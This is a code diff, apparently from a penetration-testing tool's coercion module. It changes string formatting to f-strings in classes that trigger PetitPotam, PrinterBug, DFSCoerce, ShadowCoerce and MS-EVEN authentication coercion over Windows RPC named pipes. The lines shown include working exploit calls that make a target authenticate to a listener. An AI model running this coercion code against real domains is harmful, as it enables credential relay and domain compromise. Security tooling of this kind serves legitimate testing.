@@ -221,7 +221,7 @@ class ShadowCoerceTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "Fssagentrpc": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\Fssagentrpc]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\Fssagentrpc]",
                 "MSRPC_UUID_FSRVP": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
             },
         }
@@ -338,7 +338,7 @@ class DFSCoerceTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "netdfs": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\netdfs]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\netdfs]",
                 "MSRPC_UUID_DFSNM": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
             },
         }
@@ -509,23 +509,23 @@ class PetitPotamtTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "lsarpc": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\lsarpc]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsarpc]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
             "efsrpc": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\efsrpc]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\efsrpc]",
                 "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
             },
             "samr": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\samr]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\samr]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
             "lsass": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\lsass]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsass]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
             "netlogon": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\netlogon]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\netlogon]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
         }
@@ -758,17 +758,15 @@ class PrinterBugTrigger:
         self.context = context
 
     def get_dynamic_endpoint(self, interface: bytes, target: str, timeout: int = 5) -> str:
-        string_binding = r"ncacn_ip_tcp:%s[135]" % target
+        string_binding = rf"ncacn_ip_tcp:{target}[135]"
         rpctransport = transport.DCERPCTransportFactory(string_binding)
         rpctransport.set_connect_timeout(timeout)
         dce = rpctransport.get_dce_rpc()
-        self.context.log.debug(
-            "Trying to resolve dynamic endpoint %s" % repr(uuid.bin_to_string(interface))
-        )
+        self.context.log.debug(f"Trying to resolve dynamic endpoint {uuid.bin_to_string(interface)!r}")
         try:
             dce.connect()
         except Exception as e:
-            self.context.log.warning("Failed to connect to endpoint mapper: %s" % e)
+            self.context.log.warning(f"Failed to connect to endpoint mapper: {e}")
             raise e
         try:
             endpoint = epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
@@ -777,17 +775,13 @@ class PrinterBugTrigger:
             )
             return endpoint
         except Exception as e:
-            self.context.log.debug(
-                "Failed to resolve dynamic endpoint %s"
-                % repr(uuid.bin_to_string(interface))
-            )
+            self.context.log.debug(f"Failed to resolve dynamic endpoint {uuid.bin_to_string(interface)!r}")
             raise e
-
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "spoolss": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\spoolss]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\spoolss]",
                 "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                 "port": 445
             },
@@ -835,7 +829,7 @@ class PrinterBugTrigger:
 
     def exploit(self, dce, listener, target, always_continue, pipe):
         try:
-            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
+            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         except Exception as e:
             if str(e).find("Broken pipe") >= 0:
                 # The connection timed-out. Let's try to bring it back next round
@@ -853,7 +847,7 @@ class PrinterBugTrigger:
             request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
             request["hPrinter"] = resp["pHandle"]
             request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
-            request["pszLocalMachine"] = "\\\\%s\x00" % listener
+            request["pszLocalMachine"] = f"\\\\{listener}\x00"
             request["fdwOptions"] = 0x00000000
             request["dwPrinterLocal"] = 0
             dce.request(request)
@@ -885,7 +879,7 @@ class PrinterBugTrigger:
             request = RpcRemoteFindFirstPrinterChangeNotification()
             request["hPrinter"] = resp["pHandle"]
             request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
-            request["pszLocalMachine"] = "\\\\%s\x00" % listener
+            request["pszLocalMachine"] = f"\\\\{listener}\x00"
             request["fdwOptions"] = 0x00000000
             request["dwPrinterLocal"] = 0
             request["cbBuffer"] = NULL
@@ -908,7 +902,7 @@ class MSEvenTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "eventlog": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\eventlog]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\eventlog]",
                 "MSRPC_UUID_EVEN": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
             },
         }
